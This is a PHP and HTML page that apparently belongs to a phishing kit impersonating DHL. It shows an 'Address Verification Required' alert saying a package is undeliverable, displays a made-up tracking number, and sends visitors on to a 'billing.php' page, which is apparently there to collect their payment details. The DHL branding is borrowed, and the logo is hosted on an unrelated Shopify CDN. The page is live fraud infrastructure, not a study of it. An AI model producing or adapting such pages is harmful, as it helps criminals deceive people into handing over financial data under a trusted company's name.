<?php
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Verification Required</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --dhl-red: #D40511;
            --dhl-yellow: #FFCC00;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f9fa;
            padding-top: 20px;
        }
        
        .alert-box {
            border-left: 5px solid var(--dhl-red);
            background-color: #fff9f9;
            padding: 15px;
            border-radius: 4px;
        }
        
        .tracking-card {
            max-width: 500px;
            border-radius: 10px;
            border: 1px solid #eee;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }
        
        .btn-dhl {
            background-color: var(--dhl-red);
            color: white;
            font-weight: 600;
            padding: 12px 25px;
            border-radius: 8px;
            transition: all 0.2s;
        }
        
        .btn-dhl:hover {
            background-color: #b30000;
            transform: translateY(-2px);
        }
        
        .tracking-number {
            font-family: 'Courier New', monospace;
            font-size: 1.1rem;
            letter-spacing: 1px;
            font-weight: bold;
        }
        
        /* Mobile-specific styles */
        @media (max-width: 576px) {
            body {
                padding: 10px;
                background-color: white;
            }
            
            .tracking-card {
                border: none;
                box-shadow: none;
            }
            
            .container {
                padding: 0;
            }
            
            .btn-dhl {
                padding: 15px 25px;
                font-size: 1.1rem;
            }
            
            .alert-box {
                margin-left: -15px;
                margin-right: -15px;
                border-left: none;
                border-radius: 0;
                border-top: 3px solid var(--dhl-red);
            }
        }
    </style>
</head>
<body>
    <div class="container py-3">
        <div class="row justify-content-center">
            <div class="col-md-8 col-lg-6">
                <div class="card tracking-card shadow-sm p-4 mx-auto">
                    
                    <div class="text-center mb-4" style="background-color: #FFCC00; padding: 8px 0;">
                        <img src="https://cdn.shopify.com/s/files/1/0930/7134/3889/files/cqs.svg?v=1749563770" alt="DHL" style="height:30px;">
                    </div>
                    
                    <div class="alert alert-box mb-4">
                        <h5 class="fw-bold"><i class="fas fa-exclamation-circle text-danger me-2"></i> Address Verification Required</h5>
                        <p class="mb-0">We're unable to deliver your package due to incorrect shipping details.Please update your address so we can redeliver it as soon as possible.</p>
                    </div>
                    
                  
                    <div class="mb-4">
                        <div class="d-flex justify-content-between mb-3 py-2 border-bottom">
                            <span class="text-muted">Date:</span>
                            <span class="fw-bold">06/11/2025</span>
                        </div>
                       
                        <div class="mb-3 mt-4">
                            <p class="text-muted mb-2">Your tracking number:</p>
                            <div class="input-group">
                                <input type="text" class="form-control tracking-number text-center py-2" value="UZ893USUY89DK" readonly style="font-size: 1.2rem;">
                                <button class="btn btn-outline-secondary py-2" type="button" onclick="copyTracking()">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Action Button - Full width on mobile -->
                    <div class="text-center mt-4">
                        <button onclick="window.location='billing.php'" class="btn btn-dhl btn-lg w-100">
                            <?php echo getLang("_CONTINUE"); ?> <i class="fas fa-arrow-right ms-2"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function copyTracking() {
            const trackingInput = document.querySelector('.tracking-number');
            trackingInput.select();
            document.execCommand('copy');
            
            // Mobile-friendly notification
            const originalText = document.querySelector('.btn-outline-secondary').innerHTML;
            document.querySelector('.btn-outline-secondary').innerHTML = '<i class="fas fa-check"></i> Copied!';
            setTimeout(() => {
                document.querySelector('.btn-outline-secondary').innerHTML = originalText;
            }, 2000);
        }
    </script>
    
</body>
</html>